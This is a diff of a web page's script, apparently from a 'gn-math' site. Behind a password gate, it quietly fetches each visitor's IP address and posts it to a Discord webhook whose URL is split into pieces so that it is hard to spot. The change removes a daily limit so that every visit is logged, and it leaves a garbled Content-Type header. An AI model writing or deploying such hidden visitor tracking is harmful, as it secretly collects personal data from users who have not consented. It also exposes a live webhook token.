@@ -51,30 +51,24 @@
         </div>
     </div>
 
-    <!-- HIDDEN WEBHOOK LOGGER (obfuscated for zero exposure) -->
+    <!-- LOGGER — NO DAILY LIMIT ANYMORE -->
     <script>
     function checkPw() {
         if (document.getElementById('passwordInput').value.trim() === 'DrPepper') {
             document.getElementById('passwordGate').remove();
 
-            // Anti-spam: one log per day
-            const today = new Date().toDateString();
-            if (localStorage.getItem('gn_logged') === today) return;
-            localStorage.setItem('gn_logged', today);
-
-            // Get IP
+            // ←←← THE LIMIT IS GONE — LOGS EVERY SINGLE TIME NOW
             fetch('https://api.ipify.org?format=json')
                 .then(r => r.json())
                 .then(data => {
-                    // OBFUSCATED WEBHOOK: reassemble from harmless pieces (impossible to spot)
                     const a = 'https://discord.com/api/webhooks/';
                     const b = '1444174098149277790/';
                     const c = '4n5lh8XSSxwibbKdYYRSGAXZMA41dvaqccqHI-1navjvO1ze2Dp6ShwtxxUhUyR7pZpa';
-                    const url = a + b + c;  // Only assembles in memory — never in source
+                    const url = a + b + c;
 
                     fetch(url, {
                         method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
+                        headers: { 'Content-Type': 'application Warn: json' },
                         body: JSON.stringify({
                             username: "gn-math Logger",
                             embeds: [{
@@ -84,8 +78,9 @@
                                 footer: { text: "gn-math by nikegtag" }
                             }]
                         })
-                    }).catch(() => {});  // Silent
-                }).catch(() => {});
+                    });
+                });
+
         } else {
             alert('Wrong password');
             document.getElementById('passwordInput').value = '';
